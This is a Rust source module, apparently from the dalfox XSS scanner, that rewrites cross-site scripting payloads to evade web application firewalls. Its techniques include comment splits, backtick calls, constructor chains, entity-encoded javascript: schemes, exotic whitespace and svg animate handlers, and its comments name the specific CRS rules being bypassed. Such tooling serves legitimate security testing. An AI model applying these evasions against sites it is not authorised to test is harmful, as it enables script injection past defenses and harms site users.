//! Mutation implementations: each `MutationType` variant's payload rewrite.
//!
//! Grouped by technique family (HTML tag/attribute, JS call, HTML entity, URL
//! scheme). The parent's `apply_single_mutation` dispatches to the
//! `pub(super)` entry points here; the remaining functions are shared parsing
//! primitives kept private to this module.

/// JS sinks whose `name(...)` call shape the keyword-call mutations
/// (`backtick_parens`, `constructor_chain`) rewrite. Kept explicit so we
/// only touch real execution sinks and not arbitrary `foo(bar)` text.
/// First match wins, so order is priority-driven.
const CALL_SINK_NAMES: &[&str] = &["alert", "confirm", "prompt", "print", "eval"];

/// Locate the first `<sink>(...)` call in `payload` and return
/// `(name_start, open_paren_idx, close_paren_idx)`. Uses balanced-paren
/// matching from the opening `(` so nested parens in the argument
/// (`alert((1))`, `alert(String(1))`) close correctly. Returns `None`
/// when no known sink call is present or its parens are unbalanced.
///
/// The sink keyword must sit at an identifier boundary: a bare
/// `payload.find("eval(")` also matches the *tail* of a longer identifier
/// (`retrieval(`, `myeval(`, `fingerprint(` contains `print(`), and the
/// callers rewrite the call by slicing at `name_start`, so a substring match
/// splices the wrapper into the middle of an unrelated identifier and emits
/// broken JS. Reachable with user `--custom-payload` values. Every match of a
/// keyword is scanned so a rejected substring hit does not hide a later valid
/// call.
pub(super) fn find_sink_call(payload: &str) -> Option<(usize, usize, usize)> {
    let bytes = payload.as_bytes();
    for name in CALL_SINK_NAMES {
        let needle = format!("{}(", name);
        for (pos, _) in payload.match_indices(&needle) {
            // Reject a match whose left edge is glued to a JS
            // identifier-continuation byte — it is the tail of a longer name,
            // not a call to this sink.
            if pos > 0 {
                let prev = bytes[pos - 1];
                if prev.is_ascii_alphanumeric() || prev == b'_' || prev == b'$' {
                    continue;
                }
            }
            let open = pos + name.len(); // index of '('
            let mut depth = 0usize;
            let mut k = open;
            while k < bytes.len() {
                match bytes[k] {
                    b'(' => depth += 1,
                    b')' => {
                        depth -= 1;
                        if depth == 0 {
                            return Some((pos, open, k));
                        }
                    }
                    _ => {}
                }
                k += 1;
            }
        }
    }
    None
}

/// Locate the first HTML tag opening (`<` followed by 2+ ASCII letters,
/// optionally preceded by `/`) and return `(letters_start, letters_len)`.
/// Used by tag-based mutations to operate on any HTML tag rather than a
/// fixed list of hardcoded names.
fn find_first_tag_name(payload: &str) -> Option<(usize, usize)> {
    let bytes = payload.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            let mut j = i + 1;
            if j < bytes.len() && bytes[j] == b'/' {
                j += 1;
            }
            let start = j;
            while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
                j += 1;
            }
            let len = j - start;
            if len >= 2 {
                return Some((start, len));
            }
        }
        i += 1;
    }
    None
}

/// Locate the first `<TAG SEP ATTR` pattern where SEP is a space or `/`
/// and ATTR is an ASCII identifier. Returns `(tag_lower, sep_index,
/// sep_char)` for the caller to act on. Single-pass over the payload.
pub(super) fn find_first_tag_attr_break(payload: &str) -> Option<(String, usize, char)> {
    let bytes = payload.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            let mut j = i + 1;
            if j < bytes.len() && bytes[j] == b'/' {
                j += 1;
            }
            let tag_start = j;
            while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
                j += 1;
            }
            if j == tag_start {
                i += 1;
                continue;
            }
            // SEP must be space or `/`, followed by an attribute name letter.
            if j < bytes.len()
                && (bytes[j] == b' ' || bytes[j] == b'/')
                && j + 1 < bytes.len()
                && bytes[j + 1].is_ascii_alphabetic()
            {
                let tag = payload[tag_start..j].to_ascii_lowercase();
                let sep_char = bytes[j] as char;
                return Some((tag, j, sep_char));
            }
        }
        i += 1;
    }
    None
}

/// Replace one byte at `idx` in `payload` with `new_char` (ASCII).
/// Caller guarantees `idx` is on an ASCII byte boundary.
fn replace_byte_at(payload: &str, idx: usize, new_char: char) -> String {
    debug_assert!(payload.is_char_boundary(idx));
    debug_assert!(new_char.is_ascii());
    let mut out = String::with_capacity(payload.len());
    out.push_str(&payload[..idx]);
    out.push(new_char);
    out.push_str(&payload[idx + 1..]);
    out
}

/// Insert `<!---->` partway through the first HTML tag name encountered.
///
/// Split offset is `min(3, ceil(len/2))` so short tags (`img`, `svg`)
/// split after 2 letters and longer tags (`script`, `iframe`) split
/// after 3 — preserves prior behavior while extending coverage to every
/// HTML tag rather than the original 11-entry literal list.
pub(super) fn html_comment_split(payload: &str) -> String {
    if let Some((start, len)) = find_first_tag_name(payload) {
        let split_offset = if len >= 6 {
            3
        } else if len >= 3 {
            2
        } else {
            1
        };
        let split_at = start + split_offset;
        let mut out = String::with_capacity(payload.len() + 7);
        out.push_str(&payload[..split_at]);
        out.push_str("<!---->");
        out.push_str(&payload[split_at..]);
        return out;
    }
    payload.to_string()
}

/// Pick the alt whitespace char for a `<TAG SEP ATTR` match.
///
/// Covers any HTML tag now (not the original 14-entry literal list).
/// The mapping reproduces prior outputs for the tags that were already
/// covered (svg/body → newline, details/audio → carriage return,
/// everything else → tab) and extends "tab" to every other tag.
pub(super) fn whitespace_alt_char(tag_lower: &str, sep: char) -> char {
    if sep == '/' {
        return '\t';
    }
    match tag_lower {
        "svg" | "body" => '\n',
        "details" | "audio" => '\r',
        _ => '\t',
    }
}

/// Replace the space/slash between an HTML tag and its first attribute
/// with a tab/newline/CR (per `whitespace_alt_char`). Mutates the first
/// matching break in the payload.
pub(super) fn whitespace_mutation(payload: &str) -> String {
    if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
        let alt = whitespace_alt_char(&tag, sep);
        return replace_byte_at(payload, sep_idx, alt);
    }
    payload.to_string()
}

/// JS sinks worth splitting with `/**/`. Keeping this list explicit
/// (rather than splitting any IDENT) avoids mutating identifiers that
/// just happen to contain a paren — e.g. `class=foo(bar)`.
const JS_SINK_NAMES: &[&str] = &[
    "alert",
    "confirm",
    "prompt",
    "eval",
    "Function",
    "setTimeout",
    "setInterval",
    "fetch",
    "XMLHttpRequest",
    "import",
    "execScript",
];

/// Split a JS sink name with `/**/` partway through, on the first
/// match found in the payload. Split offset is `len/2` (floor) so the
/// two halves each carry a recognizable substring — matches the prior
/// per-name behavior (`al/**/ert`, `con/**/firm`, `pro/**/mpt`, …).
/// Tries `name(` first, then `` name` `` (template-literal call form)
/// so both `alert(1)` and `` alert`1` `` get mutated.
pub(super) fn js_comment_split(payload: &str) -> String {
    for name in JS_SINK_NAMES {
        if name.len() < 3 {
            continue;
        }
        let split_idx = (name.len() / 2).max(2);
        let prefix = &name[..split_idx];
        let suffix = &name[split_idx..];
        // Match either `name(` or `` name` `` to cover both the standard
        // call and the template-literal form.
        for follower in ['(', '`'] {
            let needle = format!("{}{}", name, follower);
            if let Some(pos) = payload.find(&needle) {
                let mut out = String::with_capacity(payload.len() + 4);
                out.push_str(&payload[..pos]);
                out.push_str(prefix);
                out.push_str("/**/");
                out.push_str(suffix);
                out.push(follower);
                out.push_str(&payload[pos + needle.len()..]);
                return out;
            }
        }
    }
    payload.to_string()
}

/// Render the inside of a backtick template literal for a sink-call
/// argument. Bare numbers and simple quoted strings reduce to their raw
/// text (`1` → `` `1` ``, `'XSS'` → `` `XSS` ``); anything else — member
/// access, regex, expressions — is wrapped in `${…}` so it still
/// evaluates (`document.domain` → `` `${document.domain}` ``).
fn backtick_template_body(arg: &str) -> String {
    let trimmed = arg.trim();
    if trimmed.is_empty() {
        return String::new();
    }
    // Bare integer literal: emit verbatim (`alert(1)` → `` alert`1` ``).
    if trimmed.bytes().all(|b| b.is_ascii_digit()) {
        return trimmed.to_string();
    }
    // Simple `'…'` / `"…"` literal with no inner quote/backtick/`$`: drop
    // the quotes so the cooked template string carries the same text.
    let b = trimmed.as_bytes();
    if b.len() >= 2 {
        let q = b[0];
        if (q == b'\'' || q == b'"') && b[b.len() - 1] == q {
            let inner = &trimmed[1..trimmed.len() - 1];
            if !inner.as_bytes().contains(&q) && !inner.contains('`') && !inner.contains('$') {
                return inner.to_string();
            }
        }
    }
    // Expression / member access / regex: interpolate so it executes.
    format!("${{{}}}", trimmed)
}

/// Replace a sink call's parentheses with a backtick template literal.
/// `alert(1)` → `` alert`1` ``, `alert(document.domain)` →
/// `` alert`${document.domain}` ``, `alert('XSS')` → `` alert`XSS` ``.
/// Generalised over the argument so it fires on real payloads instead of
/// a fixed `alert(1)` / `confirm(1)` table.
pub(super) fn backtick_parens(payload: &str) -> String {
    if let Some((_name_start, open, close)) = find_sink_call(payload) {
        let arg = &payload[open + 1..close];
        let body = backtick_template_body(arg);
        let mut out = String::with_capacity(payload.len() + body.len() + 2);
        out.push_str(&payload[..open]); // up to and including the sink name
        out.push('`');
        out.push_str(&body);
        out.push('`');
        out.push_str(&payload[close + 1..]);
        return out;
    }
    payload.to_string()
}

/// Wrap a JS snippet as a string literal, picking a quote char that
/// avoids escaping when possible, falling back to single-quote with the
/// inner single quotes backslash-escaped. Keeps the constructor-chain
/// string valid even when the call argument itself is quoted.
pub(super) fn wrap_js_string(s: &str) -> String {
    let has_single = s.contains('\'');
    let has_double = s.contains('"');
    if !has_single {
        format!("'{}'", s)
    } else if !has_double {
        format!("\"{}\"", s)
    } else {
        format!("'{}'", s.replace('\'', "\\'"))
    }
}

/// Wrap a sink call in a constructor chain to dodge keyword detection.
/// `alert(1)` → `[].constructor.constructor('alert(1)')()`. Generalised
/// over the argument and quote-aware, so `alert('XSS')` becomes
/// `[].constructor.constructor("alert('XSS')")()` rather than a no-op.
pub(super) fn constructor_chain(payload: &str) -> String {
    if let Some((name_start, _open, close)) = find_sink_call(payload) {
        let call = &payload[name_start..=close];
        let wrapped = wrap_js_string(call);
        let mut out = String::with_capacity(payload.len() + wrapped.len() + 28);
        out.push_str(&payload[..name_start]);
        out.push_str("[].constructor.constructor(");
        out.push_str(&wrapped);
        out.push_str(")()");
        out.push_str(&payload[close + 1..]);
        return out;
    }
    payload.to_string()
}

/// Replace first chars of JS function names with unicode escapes.
/// `alert` → `\u0061lert`
/// JS keywords / globals worth escaping the first letter of as
/// `\u00XX`. Restricted to identifiers a WAF regex is likely to match
/// literally; first match wins so the order is roughly priority-driven.
const JS_ESCAPE_NAMES: &[&str] = &[
    "alert",
    "confirm",
    "prompt",
    "eval",
    "document",
    "window",
    "location",
    "fetch",
    "Function",
    "setTimeout",
    "setInterval",
    "parent",
    "self",
    "top",
];

pub(super) fn unicode_js_escape(payload: &str) -> String {
    for name in JS_ESCAPE_NAMES {
        if let Some(pos) = payload.find(name) {
            let first = name.as_bytes()[0];
            let escaped = format!("\\u{:04x}", first as u32);
            let mut out = String::with_capacity(payload.len() + escaped.len() - 1);
            out.push_str(&payload[..pos]);
            out.push_str(&escaped);
            out.push_str(&payload[pos + 1..]);
            return out;
        }
    }
    payload.to_string()
}

/// Encode angle brackets with mixed decimal and hex HTML entities.
/// `<` → `&#60;` (decimal), `>` → `&#x3e;` (hex)
pub(super) fn mixed_html_entities(payload: &str) -> String {
    let mut result = String::with_capacity(payload.len() * 3);
    let mut use_decimal = true;
    for c in payload.chars() {
        match c {
            '<' => {
                if use_decimal {
                    result.push_str("&#60;");
                } else {
                    result.push_str("&#x3c;");
                }
                use_decimal = !use_decimal;
            }
            '>' => {
                if use_decimal {
                    result.push_str("&#62;");
                } else {
                    result.push_str("&#x3e;");
                }
                use_decimal = !use_decimal;
            }
            '"' => {
                if use_decimal {
                    result.push_str("&#34;");
                } else {
                    result.push_str("&#x22;");
                }
                use_decimal = !use_decimal;
            }
            '\'' => {
                if use_decimal {
                    result.push_str("&#39;");
                } else {
                    result.push_str("&#x27;");
                }
                use_decimal = !use_decimal;
            }
            _ => result.push(c),
        }
    }
    result
}

// ── CRS-targeting mutation implementations ──────────────────────

/// Replace the space between an HTML tag and its first attribute with
/// `/`. CRS rule 941160 expects whitespace; the slash slips past it
/// while still being a valid attribute separator. No-op when the
/// payload already uses `/` as the separator.
pub(super) fn slash_separator(payload: &str) -> String {
    if let Some((_tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
        if sep == '/' {
            return payload.to_string();
        }
        return replace_byte_at(payload, sep_idx, '/');
    }
    payload.to_string()
}

/// Replace parentheses with HTML entities to bypass JS function call detection.
/// `alert(1)` → `alert&#40;1&#41;`
/// Also supports `&lpar;`/`&rpar;` named entities.
pub(super) fn html_entity_parens(payload: &str) -> String {
    // Replace all occurrences of ( and ) with HTML decimal entities
    let mut result = payload.to_string();
    // Use &#40; for ( and &#41; for )
    if result.contains('(') || result.contains(')') {
        result = result.replace('(', "&#40;").replace(')', "&#41;");
    }
    result
}

/// Generate SVG animate element-based execution payload.
/// If the payload contains `<svg onload=X>`, transform to `<svg><animate onbegin=X attributeName=x dur=1s>`
/// For other payloads containing event handlers, wrap in SVG animate.
pub(super) fn svg_animate_exec(payload: &str) -> String {
    // Transform svg onload variants to svg animate onbegin
    for prefix in &["<svg onload=", "<SVG ONLOAD=", "<sVg onload="] {
        if let Some(rest) = payload.strip_prefix(prefix)
            && let Some(handler_end) = rest.find('>')
        {
            let handler = &rest[..handler_end];
            let clean_handler = handler.split_whitespace().next().unwrap_or(handler);
            return format!(
                "<svg><animate onbegin={} attributeName=x dur=1s>",
                clean_handler
            );
        }
    }
    // Also transform img onerror to svg animate
    if payload.contains("<img") || payload.contains("<IMG") || payload.contains("<im") {
        for prefix in &["onerror=", "ONERROR="] {
            if let Some(idx) = payload.find(prefix) {
                let after = &payload[idx + prefix.len()..];
                let handler_end = after.find([' ', '>', '\t', '\n']).unwrap_or(after.len());
                let handler = &after[..handler_end];
                return format!("<svg><animate onbegin={} attributeName=x dur=1s>", handler);
            }
        }
    }
    payload.to_string()
}

/// Pick the alt exotic-whitespace char (\x0B vertical tab vs \x0C form
/// feed) for a `<TAG SEP ATTR` match. CRS rule 941320 only checks `\s`
/// (space/tab/newline); both VT and FF slip past it.
///
/// Mapping reproduces prior outputs for the tags previously listed —
/// svg/body/details with a space separator get `\x0C`, slash-separated
/// or any other tag get `\x0B` — and extends `\x0B` to every other tag.
fn exotic_alt_char(tag_lower: &str, sep: char) -> char {
    if sep == '/' {
        return '\x0B';
    }
    match tag_lower {
        "svg" | "body" | "details" => '\x0C',
        _ => '\x0B',
    }
}

/// Replace the separator between an HTML tag and its first attribute
/// with an exotic whitespace char. Mutates only the first match.
pub(super) fn exotic_whitespace(payload: &str) -> String {
    if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
        let alt = exotic_alt_char(&tag, sep);
        return replace_byte_at(payload, sep_idx, alt);
    }
    payload.to_string()
}

/// Alternate the case of HTML tag characters.
/// `<script>` → `<ScRiPt>`, `<img` → `<ImG`, `</script>` → `</ScRiPt>`
pub(super) fn case_alternate(payload: &str) -> String {
    let mut result = String::with_capacity(payload.len());
    let mut in_tag = false;
    let mut tag_char_idx = 0u32;

    for c in payload.chars() {
        if c == '<' {
            in_tag = true;
            tag_char_idx = 0;
            result.push(c);
        } else if in_tag && c == '/' && tag_char_idx == 0 {
            // Closing-tag slash (`</tag>`): the `/` sits immediately after `<`
            // (no tag-name char seen yet), so keep tracking and alternate the
            // tag name that follows. A `/` appearing *after* tag-name chars is
            // an attribute / self-close separator (e.g. `<svg/onload>`) and
            // still terminates the run via the branch below.
            result.push(c);
        } else if c == '>' || c == ' ' || c == '\t' || c == '\n' || c == '/' {
            in_tag = false;
            result.push(c);
        } else if in_tag && c.is_ascii_alphabetic() {
            if tag_char_idx.is_multiple_of(2) {
                result.push(c.to_ascii_uppercase());
            } else {
                result.push(c.to_ascii_lowercase());
            }
            tag_char_idx += 1;
        } else {
            result.push(c);
        }
    }
    result
}

// ── Attribute-decode-layer mutations ────────────────────────────────
//
// The mutation layer operates on raw payload strings with no knowledge of the
// reflection context, so the mutations below carry their own payload-shape
// gates. The load-bearing invariant: HTML character references are decoded
// only inside *attribute values* and are NOT decoded inside `<script>` /
// `<style>` raw text. A mutation that relies on entity decoding must therefore
// fire only when its target token sits in an attribute / event-handler /
// `javascript:`-URL position; firing inside a `<script>` body (or in bare
// body text) would emit a non-executing variant and waste a request.

/// Executable URI schemes whose value the browser runs as code when it sits in
/// a navigable-URL attribute. `data:` is intentionally excluded — top-level
/// `data:` navigation is blocked in modern browsers, so a broken `data:`
/// scheme would mostly emit non-executing variants.
const EXECUTABLE_SCHEMES: &[&str] = &["javascript:", "vbscript:"];

/// True when byte offset `idx` falls inside a `<script …>…</script>` or
/// `<style …>…</style>` raw-text region, where HTML character references are
/// NOT decoded (so entity-based mutations would not execute there).
///
/// A naive `rfind("<script")` is fooled by a literal `<script` / `<style`
/// substring sitting in another tag's *attribute value* (e.g.
/// `<img alt="<script" onerror=alert(1)>`), which would wrongly suppress a
/// valid mutation. So this scans left-to-right pairing real tag-opens with
/// their closes: a keyword counts as a tag-open only when followed by a
/// tag-name terminator, so `<script"` (a `<script` substring closed by an
/// attribute quote) is ignored. Quote state is deliberately NOT tracked —
/// reflected XSS payloads routinely start mid-attribute with a breakout quote
/// (`"><script>…`), so treating quotes as balanced would swallow a genuine
/// following `<script>`.
///
/// The residual blind spot (a literal `<script ` *with* a trailing space inside
/// an attribute value) only ever suppresses a mutation — the safe direction
/// (a missed bypass attempt, never a non-executing variant or false positive).
fn is_inside_rawtext_element(payload: &str, idx: usize) -> bool {
    let before = payload[..idx].to_ascii_lowercase();
    let bytes = before.as_bytes();
    for (open, close) in [("<script", "</script"), ("<style", "</style")] {
        let (ob, cb) = (open.as_bytes(), close.as_bytes());
        let mut inside = false;
        let mut i = 0;
        while i < bytes.len() {
            if inside {
                if bytes[i..].starts_with(cb) {
                    inside = false;
                    i += cb.len();
                } else {
                    i += 1;
                }
            } else if bytes[i..].starts_with(ob) {
                // Real tag-open only: the keyword must be followed by a tag-name
                // terminator, not more letters (`<scriptish`) or an attribute
                // quote (`alt="<script"`).
                let after = bytes.get(i + ob.len()).copied();
                if matches!(
                    after,
                    None | Some(b' ' | b'\t' | b'\n' | b'\r' | b'>' | b'/')
                ) {
                    inside = true;
                }
                i += ob.len();
            } else {
                i += 1;
            }
        }
        if inside {
            return true;
        }
    }
    false
}

/// Locate the first executable URI scheme keyword (`javascript:` / `vbscript:`)
/// sitting where the browser will HTML-decode it from an attribute value and
/// run it: either (a) immediately after an `=` (optionally quoted) — an
/// attribute value — or (b) at the very start of the payload (a bare scheme
/// payload dalfox emits for URL-sink reflection). Returns `(scheme_start,
/// keyword_len)` (keyword length excludes the trailing `:`). Returns `None`
/// when no scheme is present, it is inside `<script>` / `<style>`, or it sits
/// in mid-body text where no entity decode happens.
pub(super) fn find_executable_scheme(payload: &str) -> Option<(usize, usize)> {
    let lower = payload.to_ascii_lowercase();
    for scheme in EXECUTABLE_SCHEMES {
        let kw_len = scheme.len() - 1; // drop the trailing ':'
        let mut from = 0;
        while let Some(rel) = lower[from..].find(scheme) {
            let pos = from + rel;
            if !is_inside_rawtext_element(payload, pos) && scheme_in_exec_position(payload, pos) {
                return Some((pos, kw_len));
            }
            from = pos + 1;
        }
    }
    None
}

/// Whether the scheme keyword at byte `pos` is in a position the browser will
/// HTML-decode and dereference: bare-at-start (only leading whitespace/control
/// before it) or directly after an `=` (with an optional surrounding quote).
fn scheme_in_exec_position(payload: &str, pos: usize) -> bool {
    // (b) Bare scheme payload: only ASCII whitespace / control bytes precede it.
    if payload[..pos]
        .bytes()
        .all(|b| b.is_ascii_whitespace() || b < 0x20)
    {
        return true;
    }
    // (a) Attribute value: skip one optional quote, require a preceding `=`.
    let bytes = payload.as_bytes();
    let mut k = pos;
    if k > 0 && (bytes[k - 1] == b'"' || bytes[k - 1] == b'\'') {
        k -= 1;
    }
    k > 0 && bytes[k - 1] == b'='
}

/// True when the sink call at `name_start` sits in an HTML event-handler
/// attribute value (`on<name>=`) or a `javascript:` / `vbscript:` URL value —
/// the contexts where the attribute value is HTML-entity-decoded before the JS
/// is compiled. Scans only within the current tag (back to the nearest `<`)
/// for the handler shape so a stray `on…=` elsewhere doesn't false-trigger.
fn sink_in_attr_context(payload: &str, name_start: usize) -> bool {
    let before = payload[..name_start].to_ascii_lowercase();
    // `javascript:` / `vbscript:` URL value: the scheme must precede the sink
    // with no intervening `>` — a `>` closes the tag and drops the sink into
    // body text, where the value is NOT entity-decoded. A bare
    // `before.contains("javascript:")` would wrongly fire on
    // `<a href=javascript:x>…text alert(1)` (sink in body), emitting a
    // non-executing variant. Only the *nearest* scheme occurrence matters.
    for scheme in EXECUTABLE_SCHEMES {
        if let Some(pos) = before.rfind(scheme)
            && !before[pos..].contains('>')
        {
            return true;
        }
    }
    let tag_start = before.rfind('<').map(|i| i + 1).unwrap_or(0);
    let region = &before.as_bytes()[tag_start..];
    // Find an `on<letter>+=` event-handler attribute name.
    let mut i = 0;
    while i + 2 < region.len() {
        if region[i] == b'o' && region[i + 1] == b'n' && region[i + 2].is_ascii_alphabetic() {
            let mut j = i + 2;
            while j < region.len() && region[j].is_ascii_alphabetic() {
                j += 1;
            }
            if j < region.len() && region[j] == b'=' {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// HTML-entity-encode the first letter of a JS sink keyword when the call sits
/// in an attribute-decoded context. No-op inside `<script>` / `<style>`
/// raw text (references not decoded → SyntaxError) and when the call is not in
/// an event-handler / `javascript:`-URL context.
pub(super) fn keyword_entity_encode(payload: &str) -> String {
    if let Some((name_start, _open, _close)) = find_sink_call(payload) {
        if is_inside_rawtext_element(payload, name_start)
            || !sink_in_attr_context(payload, name_start)
        {
            return payload.to_string();
        }
        let first = payload.as_bytes()[name_start]; // ASCII letter (sink name)
        let esc = format!("&#{};", first as u32);
        let mut out = String::with_capacity(payload.len() + esc.len());
        out.push_str(&payload[..name_start]);
        out.push_str(&esc);
        out.push_str(&payload[name_start + 1..]);
        return out;
    }
    payload.to_string()
}

/// Replace EVERY top-level whitespace attribute separator in the first opening
/// tag with `/`. No-op when the first tag has fewer than two such separators
/// (the single-separator result equals `slash_separator`'s output and would be
/// deduped away). Whitespace inside quoted attribute values, the closing-tag
/// `</`, and a trailing self-closing `/>` are left untouched.
pub(super) fn multi_slash(payload: &str) -> String {
    let bytes = payload.as_bytes();
    // First opening tag: `<` directly followed by an ASCII letter.
    let mut i = 0;
    let open = loop {
        if i + 1 >= bytes.len() {
            return payload.to_string();
        }
        if bytes[i] == b'<' && bytes[i + 1].is_ascii_alphabetic() {
            break i;
        }
        i += 1;
    };
    // Skip the tag name.
    let mut j = open + 1;
    while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
        j += 1;
    }
    // Walk the attribute list to the tag's closing `>`, tracking quote state,
    // collecting the start byte of each whitespace run that separates the tag
    // name / an attribute from a following attribute name.
    let is_ws = |b: u8| matches!(b, b' ' | b'\t' | b'\n' | b'\r');
    let mut quote = 0u8;
    let mut seps: Vec<usize> = Vec::new();
    let mut k = j;
    while k < bytes.len() {
        let c = bytes[k];
        if quote != 0 {
            if c == quote {
                quote = 0;
            }
            k += 1;
            continue;
        }
        match c {
            b'"' | b'\'' => quote = c,
            b'>' => break,
            _ if is_ws(c) => {
                // Only the first byte of a whitespace run, and only when the
                // run is followed by an attribute-name letter (mirrors the
                // ATTR-letter guard in find_first_tag_attr_break).
                let run_start = k == j || !is_ws(bytes[k - 1]);
                let mut m = k + 1;
                while m < bytes.len() && is_ws(bytes[m]) {
                    m += 1;
                }
                if run_start && m < bytes.len() && bytes[m].is_ascii_alphabetic() {
                    seps.push(k);
                }
            }
            _ => {}
        }
        k += 1;
    }
    if seps.len() < 2 {
        return payload.to_string();
    }
    let sepset: std::collections::HashSet<usize> = seps.into_iter().collect();
    let mut out = String::with_capacity(payload.len());
    for (idx, ch) in payload.char_indices() {
        if sepset.contains(&idx) {
            out.push('/');
        } else {
            out.push(ch);
        }
    }
    out
}

/// Insert a `&#9;` (TAB) entity inside an executable URI scheme keyword so a
/// literal-scheme WAF regex misses it; the browser decodes the entity and the
/// URL parser strips the TAB, so the scheme still resolves. No-op outside an
/// executable-scheme attribute / bare-scheme context.
pub(super) fn scheme_break(payload: &str) -> String {
    if let Some((start, kw_len)) = find_executable_scheme(payload) {
        // Split inside the keyword (e.g. after "java" in "javascript").
        let off = (kw_len / 2).clamp(2, 4);
        let split = start + off;
        let mut out = String::with_capacity(payload.len() + 4);
        out.push_str(&payload[..split]);
        out.push_str("&#9;");
        out.push_str(&payload[split..]);
        return out;
    }
    payload.to_string()
}

/// HTML-entity-encode the leading letter of an executable URI scheme keyword
/// (`javascript:` → `&#106;avascript:`). A distinct wire signature from
/// [`scheme_break`] for the same attribute-decode mechanism. No-op outside an
/// executable-scheme attribute / bare-scheme context.
pub(super) fn entity_scheme(payload: &str) -> String {
    if let Some((start, _kw_len)) = find_executable_scheme(payload) {
        let first = payload.as_bytes()[start]; // ASCII letter (j / v)
        let esc = format!("&#{};", first as u32);
        let mut out = String::with_capacity(payload.len() + esc.len());
        out.push_str(&payload[..start]);
        out.push_str(&esc);
        out.push_str(&payload[start + 1..]);
        return out;
    }
    payload.to_string()
}
